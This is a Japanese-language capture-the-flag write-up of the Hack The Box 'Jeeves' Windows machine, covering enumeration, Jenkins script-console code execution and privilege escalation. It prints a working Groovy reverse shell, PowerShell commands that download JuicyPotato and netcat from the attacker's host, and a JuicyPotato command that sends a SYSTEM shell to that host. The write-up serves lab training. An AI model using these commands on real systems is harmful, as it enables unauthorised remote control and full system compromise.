![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/114
- #medium 
- OS :  #Windows
- Machine Author(s): [mrb3n8132](https://app.hackthebox.com/users/2984)
- Hack Date: 2025-11-18,22:16 ~ 2025-11-18,24:07 

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## Nmap

| **ポート**   | **サービス** | **バージョン**                                                    | **その他**                                                                                                                        |
| --------- | -------- | ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------ |
| 80/tcp    | **http** | Microsoft IIS httpd 10.0                                     | Supported Methods: OPTIONS, TRACE, GET, HEAD, POST / Potentially risky: TRACE / Title: Ask Jeeves / Server: Microsoft-IIS/10.0 |
| 135/tcp   | msrpc    | Microsoft Windows RPC                                        | ―                                                                                                                              |
| 445/tcp   | **SMB**  | Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) | ―                                                                                                                              |
| 50000/tcp | **http** | Jetty 9.4.z-SNAPSHOT                                         | Title: 404 Not Found / Server: Jetty(9.4.z-SNAPSHOT)                                                                           |

```bash
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 11 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=11/18%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=691C717E%P=aarch64-unknown-linux-gnu)
SEQ(SP=103%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A)
SEQ(SP=107%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=A)
OPS(O1=M542NW8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M542NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.008 days (since Tue Nov 18 13:04:20 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-18T18:15:05
|_  start_date: 2025-11-18T18:04:31
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58009/tcp): CLEAN (Timeout)
|   Check 2 (port 47760/tcp): CLEAN (Timeout)
|   Check 3 (port 39602/udp): CLEAN (Timeout)
|   Check 4 (port 46473/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```
50000番のJetty://9.4.z-SNAPSHOTが気になるな
SMBに匿名ログインできるかみる


## enum4linux
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Jeeves]
└─$ enum4linux-ng -A  $10.129.228.112
ENUM4LINUX - next generation (v1.3.5)

[!] No valid host given
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HTB/Jeeves]
└─$ 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HTB/Jeeves]
└─$ enum4linux-ng -A  10.129.228.112 
ENUM4LINUX - next generation (v1.3.5)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.228.112
[*] Username ......... ''
[*] Random Username .. 'vvjpnxvw'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 10.129.228.112    |
 =======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.228.112    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on 10.129.228.112    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =============================================================
|    Domain Information via SMB session for 10.129.228.112    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: JEEVES
NetBIOS domain name: ''                                                                                                                                                                                                                     
DNS domain: Jeeves                                                                                                                                                                                                                          
FQDN: Jeeves                                                                                                                                                                                                                                
Derived membership: workgroup member                                                                                                                                                                                                        
Derived domain: unknown                                                                                                                                                                                                                     

 ===========================================
|    RPC Session Check on 10.129.228.112    |
 ===========================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 =================================================
|    OS Information via RPC for 10.129.228.112    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10 Pro 10586                                                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: '1511'                                                                                                                                                                                                                          
OS build: '10586'                                                                                                                                                                                                                           
Native OS: Windows 10 Pro 10586                                                                                                                                                                                                             
Native LAN manager: Windows 10 Pro 6.3                                                                                                                                                                                                      
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 27.62 seconds

```
何も出てこない
FQDN: Jeeves 


## 80番アクセス
こんな感じのサイトが出てくる
![](https://i.imgur.com/TSr0lFl.png)

入力すると、こんな感じのエラーが出てくる
![](https://i.imgur.com/s7kM8ZW.png)
SQLインジェクションができるのか？

なんか、巨大な一枚のエラー画像だった
![](https://i.imgur.com/vo4x1xv.png)


### feroxbuster
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Jeeves]
└─$ feroxbuster -u http://10.129.228.112:80/ -C 404 -C 500
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.112:80/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      147l      319w     3744c http://10.129.228.112/style.css
200      GET        1l        4w       50c http://10.129.228.112/error.html
200      GET       17l       40w      503c http://10.129.228.112/
400      GET        6l       26w      324c http://10.129.228.112/error%1F_log
[####################] - 68s    60008/60008   0s      found:4       errors:0      
[####################] - 67s    30000/30000   447/s   http://10.129.228.112:80/ 
[####################] - 66s    30000/30000   453/s   http://10.129.228.112/            
```
特に興味あるものはない
# Foothold
## 50000番
Jetty://9.4.z-SNAPSHOTのバージョンから Information Disclosureの脆弱性があることはわかった
- https://www.exploit-db.com/exploits/50438
### Dirsearch
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/Jeeves]
└─$ sudo dirsearch --url=http://10.129.228.112:50000/%2e/ --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29999

Output File: /home/kali/Desktop/HTB/Jeeves/reports/http_10.129.228.112_50000/_%2e__25-11-18_13-53-24.txt

Target: http://10.129.228.112:50000/

[13:53:24] Starting: %2e/
                                                                             
Task Completed

```
特に何もなさそう？

辞書を変えてみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/Jeeves]
└─$ sudo dirsearch --url=http://10.129.228.112:50000/ --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --threads 30 --random-agent --format=simple 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                   
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220544

Output File: /home/kali/Desktop/HTB/Jeeves/reports/http_10.129.228.112_50000/__25-11-18_14-00-09.txt

Target: http://10.129.228.112:50000/

[14:00:09] Starting:                                                                                                                                                                                                                        
[14:02:52] 302 -    0B  - /askjeeves  ->  http://10.129.228.112:50000/askjeeves/

```
なんか、askjeeves/というパスがある

アクセスしてみると、Jenkinsのサイトに飛ぶ
![](https://i.imgur.com/yQuuefL.png)

Jenkinsのversionは2.87
![](https://i.imgur.com/IqjaJKz.png)

検索から、CVE-2024-23897があることがわかった
https://piyolog.hatenadiary.jp/entry/2024/01/30/031702

このPoCを試してみる
https://github.com/h4x0r-dz/CVE-2024-23897
うまく動かないので、[[Common Application#Jenkins]]のScript機能を使ったRCEを行ってみる
ipconfigを実行する
![](https://i.imgur.com/MaKmX6K.png)
実行できた

同じ要領で、whoami /allを実行する
```sh
def cmd = 'whoami /all'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

実行結果
```sh
USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```
kohsukeとして、ログインしている
SeImpersonatePrivilege があるので、Administratorへの権限昇格は容易そう

### リバースシェルを立てる
以下をJenkinsのscriptに貼り付け、実行
```sh
String host="10.10.16.28";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

ターミナル上で待ち受ける
```sh
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/Jeeves/CVE-2024-23897]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.228.112] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\.jenkins

11/18/2025  01:05 PM    <DIR>          .
11/18/2025  01:05 PM    <DIR>          ..
11/18/2025  02:18 PM                48 .owner
11/18/2025  01:05 PM             1,684 config.xml
11/18/2025  01:05 PM               156 hudson.model.UpdateC
```
リバースシェルを確立できた



# Privilege Escalation

さっき、確認したけど、もう一度、権限を確認する
```sh
C:\Users\Administrator\.jenkins>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

ERROR: Unable to get user claims information.

```
SeImpersonatePrivilegeがついているので、JuicyPotato.exeを実行できる

Windows 10 build 1809(17763)以降ではないかを確かめる
```bash
C:\Users\Administrator\.jenkins>ver
ver

Microsoft Windows [Version 10.0.10586]

```
Windows 10 build 1809(17763)以前なので、JuicyPotato.exeを実行できる
JuicyPotato.exeとnc.exeを取得
- JuicyPotato.exeは、[https://github.com/ohpe/juicy-potato/releases]で取得

JuicyPotato.exeのダウンロード
```bash
C:\Users\Administrator\.jenkins>powershell -Command "(New-Object Net.WebClient).DownloadFile('http://10.10.16.28:8888/JuicyPotato.exe','C:\Users\kohsuke\Desktop\JuicyPotato.exe')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://10.10.16.28:8888/JuicyPotato.exe','C:\Users\kohsuke\Desktop\JuicyPotato.exe')"

C:\Users\Administrator\.jenkins>powershell -Command "(New-Object Net.WebClient).DownloadFile('http://10.10.16.28:8888/nc.exe','C:\Users\kohsuke\Desktop\nc.exe')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://10.10.16.28:8888/nc.exe','C:\Users\kohsuke\Desktop\nc.exe')"

C:\Users\Administrator\.jenkins>dir C:\Users\kohsuke\Desktop
dir C:\Users\kohsuke\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Desktop

11/18/2025  02:55 PM    <DIR>          .
11/18/2025  02:55 PM    <DIR>          ..
11/18/2025  02:48 PM           347,648 JuicyPotato.exe
11/18/2025  02:55 PM            38,616 nc.exe
11/03/2017  10:22 PM                32 user.txt
               3 File(s)        386,296 bytes
               2 Dir(s)   2,626,412,544 bytes free


```
nc.exeもJuicyPotato.exeもダウンロードできたので実行する

実行
```bash
C:\Users\kohsuke\Desktop\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\kohsuke\Desktop\nc.exe 10.10.16.28 8888 -e cmd.exe" -t *
```

別ターミナルで待ち受け
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Jeeves]
└─$ nc -lvnp 8888                                                      
listening on [any] 8888 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.228.112] 49691
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

root.txtを取得しようとしたらこれ
```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\hm.txt
type C:\Users\Administrator\Desktop\hm.txt
The flag is elsewhere.  Look deeper.
```
はあ？

`dir /R` で代替データストリームを表示する
```bash
C:\>dir /R C:\Users\Administrator\Desktop
dir /R C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,626,400,256 bytes free

```

root.txtの取得
```bash
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
```


https://labs.hackthebox.com/achievement/machine/620650/114
